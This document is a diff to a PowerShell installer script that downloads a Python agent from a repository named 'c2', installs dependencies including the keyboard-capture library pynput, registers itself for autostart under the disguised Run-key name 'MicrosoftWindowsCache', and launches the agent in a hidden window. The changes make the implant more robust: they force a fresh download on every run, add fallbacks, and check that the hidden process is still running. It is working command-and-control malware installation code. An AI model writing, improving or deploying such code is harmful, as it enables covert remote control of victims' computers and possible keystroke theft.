@@ -54,7 +54,7 @@ try {
     }
 
     if (-not $pythonPath) {
-        Write-Host "[]"
+        Write-Host "[x]"
         return
     }
 
@@ -66,18 +66,18 @@ try {
         New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null
     }
 
+    # Always refresh agent.py so stale/placeholder copies cannot stick around
     $agentPyPath = Join-Path $InstallPath "agent.py"
-    if (-not (Test-Path $agentPyPath)) {
-        try {
-            $downloadUrl = "https://raw.githubusercontent.com/zen-zecode/c2/main/node/agent.py"
-            Invoke-WebRequest -Uri $downloadUrl -OutFile $agentPyPath -UseBasicParsing
-        } catch {
-            @"
-# C2 Agent - Placeholder
-import time
-while True: time.sleep(60)
-"@ | Set-Content -Path $agentPyPath -Encoding UTF8
-        }
+    $downloadUrl = "https://raw.githubusercontent.com/zen-zecode/c2/main/node/agent.py"
+    try {
+        Invoke-WebRequest -Uri $downloadUrl -OutFile $agentPyPath -UseBasicParsing
+    } catch {
+        Write-Host "[x]"
+        return
+    }
+    if (-not (Test-Path $agentPyPath) -or (Get-Item $agentPyPath).Length -lt 1000) {
+        Write-Host "[x]"
+        return
     }
 
     $venvPath = Join-Path $InstallPath "venv"
@@ -89,12 +89,13 @@ while True: time.sleep(60)
         & $pythonPath -m venv $venvPath 2>&1 | Out-Null
     }
     if (-not (Test-Path $pyvenvCfg)) {
-        Write-Host "[]"
+        Write-Host "[x]"
         return
     }
 
     $venvPython = Join-Path $venvPath "Scripts\python.exe"
     $venvPythonw = Join-Path $venvPath "Scripts\pythonw.exe"
+    if (-not (Test-Path $venvPythonw)) { $venvPythonw = $venvPython }
 
     $reqFile = Join-Path $InstallPath "requirements.txt"
     @"
@@ -105,7 +106,11 @@ pynput>=1.7.0
 
     & $venvPython -m pip install uv --quiet --disable-pip-version-check 2>&1 | Out-Null
     $uvExe = Join-Path $venvPath "Scripts\uv.exe"
-    & $uvExe pip install -r $reqFile --python $venvPython --quiet 2>&1 | Out-Null
+    if (Test-Path $uvExe) {
+        & $uvExe pip install -r $reqFile --python $venvPython --quiet 2>&1 | Out-Null
+    } else {
+        & $venvPython -m pip install -r $reqFile --quiet --disable-pip-version-check 2>&1 | Out-Null
+    }
 
     $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     $name = "MicrosoftWindowsCache"
@@ -123,8 +128,16 @@ pynput>=1.7.0
         $sh.Save()
     }
 
-    Start-Process -FilePath $venvPythonw -ArgumentList "`"$agentPyPath`"" `
-        -WorkingDirectory $venvPath -WindowStyle Hidden
-} catch {}
+    $proc = Start-Process -FilePath $venvPythonw -ArgumentList "`"$agentPyPath`"" `
+        -WorkingDirectory $venvPath -WindowStyle Hidden -PassThru
+    Start-Sleep -Seconds 2
+    if (-not $proc -or $proc.HasExited) {
+        Write-Host "[x]"
+        return
+    }
+} catch {
+    Write-Host "[x]"
+    return
+}
 
 Write-Host "[]"
